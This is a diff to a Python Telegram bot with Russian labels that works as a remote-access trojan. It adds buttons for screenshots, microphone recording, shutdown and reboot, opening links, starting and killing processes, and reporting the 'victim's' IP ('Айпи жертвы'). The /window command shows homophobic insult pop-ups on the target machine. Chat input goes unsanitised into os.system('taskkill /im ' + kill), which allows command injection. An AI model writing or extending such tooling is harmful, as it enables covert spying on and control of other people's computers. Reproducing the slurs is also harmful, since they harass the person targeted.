@@ -11,12 +11,17 @@ bot = telebot.TeleBot(mytoken)
 
 mainkeyboard = telebot.types.ReplyKeyboardMarkup(True, True)
 
-mainkeyboard.row('Питание🟢','Запись🔊','Браузер🟡','Приложения🟥','ip🈴')
+mainkeyboard.row('Питание🟢','Запись🔊','Браузер🟡','Приложения🟥','ip🈴','Скриншот👀','Помощь⚒')
 
 
 powerkeyboard = telebot.types.ReplyKeyboardMarkup(True, True)
 
 powerkeyboard.row('Назад🗿','Выключить пк⚠️','Перезагрузить пк🖥')
+
+
+appkeyboard = telebot.types.ReplyKeyboardMarkup(True, True)
+
+appkeyboard.row('Назад🗿','Убить приложение❌','Включить приложение✅')
 
 
 
@@ -32,67 +37,73 @@ def commands(message):
                 
                 
                 
-        if message.text == 'Питание🟢':
+        elif message.text == 'Питание🟢':
                 bot.send_message(message.chat.id,'Выбери действие',reply_markup=powerkeyboard)
                 
-                
-        if message.text == 'Назад🗿':
+    
+        elif message.text == 'Приложения🟥':
+            bot.send_message(message.chat.id,'Выбери действие',reply_markup=appkeyboard)
+
+
+        elif message.text == 'Назад🗿':
                 bot.send_message(message.chat.id,'Вернул вас назад',reply_markup=mainkeyboard)
 
         
     
         elif message.text == '/off' or message.text == 'Выключить пк⚠️':
-                bot.send_message(message.chat.id,'Компьютер будет выключен!')
+                bot.send_message(message.chat.id,'Компьютер будет выключен!',reply_markup=powerkeyboard)
                 os.system('shutdown -s')
 
         
-        elif message.text == '/help':
-                 bot.send_message(message.chat.id,'/off(выкл пк)\n/open(открыть ссылку в браузере)\n/screen(сделать скриншот экрана)\n/process(включить процесс)\n/kill(убить процесс)\n/reboot(перезагрузить пк)\n/window(тест на гея)\n/ip(узнать ip,город,браузер)\n/rep(запустить файл.mp3)\n/record(записать звки с микрофона)')
+        elif message.text == '/help' or message.text == 'Помощь⚒':
+                 bot.send_message(message.chat.id,'/off(выкл пк)\n/open(открыть ссылку в браузере)\n/screen(сделать скриншот экрана)\n/process(включить процесс)\n/kill(убить процесс)\n/reboot(перезагрузить пк)\n/window(тест на гея)\n/ip(узнать ip,город,браузер)\n/rep(запустить файл.mp3)\n/record(записать звки с микрофона)',reply_markup=mainkeyboard)
                 
 
               
         
-        elif message.text == '/open':
+        elif message.text == '/open' or message.text == 'Браузер🟡':
                 bot.register_next_step_handler(message,get_url)
-                bot.send_message(message.chat.id,'Отправьте ссылку!')
+                bot.send_message(message.chat.id,'Отправьте ссылку!',reply_markup=mainkeyboard)
                 
 
-        elif message.text == '/screen':
+        elif message.text == '/screen' or message.text == 'Скриншот👀':
                 try:  
                         os.remove("screenshot.png")
+                        bot.send_message(message.chat.id,'Удалил старый скриншот,повторите команду',reply_markup=mainkeyboard)
                 except:
                         bot.send_message(message.chat.id,'Делаю скриншот')
                         screen = pyautogui.screenshot('screenshot.png')
                         screen = open('screenshot.png', 'rb')
-                        bot.send_photo(message.chat.id, screen)
+                        bot.send_photo(message.chat.id, screen,reply_markup=mainkeyboard)
                 
-        elif message.text == '/process':
-                bot.send_message(message.chat.id,'Какой процесс хотите запустить(steam.exe)')
+        elif message.text == '/process' or message.text == 'Включить приложение✅':
+                bot.send_message(message.chat.id,'Какой процесс хотите запустить(steam.exe)',reply_markup=appkeyboard)
                 bot.register_next_step_handler(message,get_process)
         
         
-        elif message.text == '/ip':
+        elif message.text == '/ip' or message.text == 'ip🈴':
                 url = 'https://yandex.ru/internet/'
                 page = requests.get(url)
                 soup = BeautifulSoup(page.text, "html.parser")
                 ip = soup.findAll('ul', class_='general-info layout__general-info')
                 ip = str(ip)
                 ip = re.sub('<[^>]*>', '\n', ip)
-                bot.send_message(message.chat.id,'Айпи жертвы - ' + str(ip))
+                bot.send_message(message.chat.id,'Айпи жертвы - ' + str(ip),reply_markup=mainkeyboard)
         
         
         
         elif message.text == '/window':
                 pyautogui.alert("Ты пидор", "Тест", button="да")
                 pyautogui.alert("Ты гей", "Тест", button="да")
-                bot.send_message(message.chat.id,'Окна с тестом на гея созданы')
+                bot.send_message(message.chat.id,'Окна с тестом на гея созданы',reply_markup=mainkeyboard)
                 
-        elif message.text == '/kill':
+        elif message.text == '/kill' or message.text == 'Убить приложение❌':
                 bot.send_message(message.chat.id,'Какой процесс хотите убить(steam.exe)')
                 bot.register_next_step_handler(message,get_kill)                   
                 
                 
         elif message.text == '/reboot' or message.text == 'Перезагрузить пк🖥':
+                bot.send_message(message.chat.id,'Перезагрузил!')
                 os.system('shutdown -r -t 0')
 
         elif message.text == '/rep':
@@ -102,7 +113,7 @@ def commands(message):
 
         
         
-        elif message.text == '/record':
+        elif message.text == '/record' or message.text == 'Запись🔊':
                 bot.send_message(message.chat.id,'Сколько секунд записать?(не больше 60):')
                 bot.register_next_step_handler(message,get_record)
 
@@ -159,10 +170,10 @@ def get_record(message):
 
 
                 else:
-                        bot.send_message(message.chat.id,'сказано не больше 60sec!')
+                        bot.send_message(message.chat.id,'сказано не больше 60sec!',reply_markup=mainkeyboard)
                 
         except:
-                bot.send_message(message.chat.id,'в числовом формате!')
+                bot.send_message(message.chat.id,'в числовом формате!',reply_markup=mainkeyboard)
 
         
         
@@ -172,9 +183,9 @@ def get_audio(message):
         audio = message.text
         try:
                 playsound(audio)
-                bot.send_message(message.chat.id,'Включил данный файл\n ' + audio)
+                bot.send_message(message.chat.id,'Включил данный файл\n ' + audio,reply_markup=mainkeyboard)
         except:
-                bot.send_message(message.chat.id,'Не нашел данный файл\n ' + audio)
+                bot.send_message(message.chat.id,'Не нашел данный файл\n ' + audio,reply_markup=mainkeyboard)
                 
                 
 
@@ -185,7 +196,7 @@ def get_url(message):
         global url
         url = message.text
         webbrowser.open_new(url)
-        bot.send_message(message.chat.id,'Ссылка открыта!')
+        bot.send_message(message.chat.id,'Ссылка открыта!',reply_markup=mainkeyboard)
 
 
         
@@ -195,9 +206,9 @@ def get_process(message):
         process = message.text
         try:
                 os.startfile(process)
-                bot.send_message(message.chat.id,'Включил данный процесс\n' + process)
+                bot.send_message(message.chat.id,'Включил данный процесс\n' + process,reply_markup=appkeyboard)
         except:
-                 bot.send_message(message.chat.id,'Вы ввели что-то неправильно,ошибка!')
+                 bot.send_message(message.chat.id,'Вы ввели что-то неправильно,ошибка!',reply_markup=mainkeyboard)
 
                         
                         
@@ -208,9 +219,9 @@ def get_kill(message):
         kill = message.text
         try:
                 os.system("taskkill /im " + kill)
-                bot.send_message(message.chat.id,'Данный процесс убит\n' + kill)
+                bot.send_message(message.chat.id,'Данный процесс убит\n' + kill,reply_markup=appkeyboard)
         except:
-                bot.send_message(message.chat.id,'Вы ввели что-то неправильно,ошибка!')
+                bot.send_message(message.chat.id,'Вы ввели что-то неправильно,ошибка!',reply_markup=mainkeyboard)
 
                 
                         
